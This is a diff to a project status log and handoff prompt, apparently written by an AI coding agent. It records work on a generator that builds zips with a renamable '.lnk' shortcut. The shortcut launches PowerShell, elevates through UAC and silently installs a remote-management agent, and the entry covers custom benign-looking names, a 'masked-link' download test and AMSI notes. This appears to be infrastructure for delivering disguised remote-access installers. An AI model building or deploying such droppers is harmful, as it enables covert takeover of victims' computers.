@@ -42,6 +42,35 @@ Verified demo: zip `['Setup.lnk','win/Launcher.exe','win/agent.bin']` with `.lnk
 Guardrails: AMSI `none`; `/build` auth not weakened; `LATEST_AGENT_VER` unchanged; no code-sign token; accept only via
 real download; **defaults must produce the exact confirmed zip**.
 
+## STATUS 2026-09-15 (NIGHT) — web-app UI + zipName live; TWO validation bugs fixed & deployed
+- **Web app (`vantra`, `main` `c07e12d`):** the create-zip ZIP (launcher) method now shows THREE optional
+  "leave default or edit" fields — **Link name** (`Update.lnk`), **Folder name** (`launcher`), **Zip name**
+  (`Agent.zip`). They are sent as `flags.updateLinkName` / `flags.innerFolder` / `flags.zipName` via
+  `lib/zip-generator.ts` → `/build`. Bare-name sanitizer in `lib/zip-generator.ts` + zod bounds in
+  `app/api/devices/deployments/route.ts` (no `/ \ " ..` control, ≤64, blank=default & omitted). Deployed to
+  `/opt/vantra`, rebuilt (`.next` `iKd7p3…`), `vantra.service` restarted.
+- **Generator `zipName` (`installer-dev` `8016a65`):** `storage.saveZipName/getZipName`; `launcher-build.ts`
+  sanitizes+persists it (`clean` default `Agent.zip`); `routes.ts getZipDownload` sets
+  `Content-Disposition: attachment; filename="<zipName>"` (fallback `Agent.zip`). Verified: a renamed job served
+  `attachment; filename="Team-Bundle.zip"`.
+- **Generator validation (`installer-dev` `2d83470`) — TWO bugs found via the FIRST real rename attempt in the web
+  app (which returned the web-app 502 "ZIP installer was created but packaging failed"):**
+  1. `launcher-validate.ts` decompressed the scan target via a HARD-CODED `entries.localOffsets["Update.lnk"]`, so a
+     renamed link name → `could not inflate Update.lnk` → `LAUNCHER-VALIDATE-FAILED`. Fixed to
+     `entries.localOffsets[updateLinkName]`.
+  2. The PowerShell-bridge command text inside the `.lnk` is **UTF-16LE** (ASCII char + NUL byte), so the raw latin1
+     `scanHay` could never match `.<folder>\Launcher.exe` / `RunAs` → `Update.lnk bridge shape` FAIL for ANY link or
+     folder (default included). Fixed by NUL-stripping before the trigram + shape checks
+     (`scanHay = lnkInflated.toString("latin1").replace(/\u0000/g, "")`) — also makes the trigram scan stronger (it
+     now sees the decoded command, so a UTF-16-embedded `-Enc`/`IEX` would be caught).
+- **Verified with a renamed build** (link `Setup.lnk`, folder `win`, zip `Team-Bundle.zip`): `[validate] RESULT|
+  LAUNCHER-VALIDATE-OK: all rows PASS`, bridge shape `.\win\Launcher.exe -Verb RunAs`, served name
+  `Team-Bundle.zip`, entries `['Setup.lnk','win/Launcher.exe','win/agent.bin']`. Generator restarted + `/healthz`
+  → `ready:true`.
+- **Remaining (operator):** the live UI → masked-link → VM double-click acceptance (custom names + a defaults
+  regression). VM `Sc` cleaned: both services deleted, `C:\Program Files\TacticalAgent` + `C:\ProgramData\TacticalRMM`
+  removed, no processes left.
+
 ## NEXT-AGENT PROMPT (copy to the next agent)
 > FIX 1 closed; confirmed working flow = zip {Update.lnk, launcher/{Launcher.exe, agent.bin}}; Update.lnk → OS PowerShell
 > bridge `.\launcher\Launcher.exe -Verb RunAs` → UAC → silent install; portable, no baked path. Deployed to VPS, VM clean.
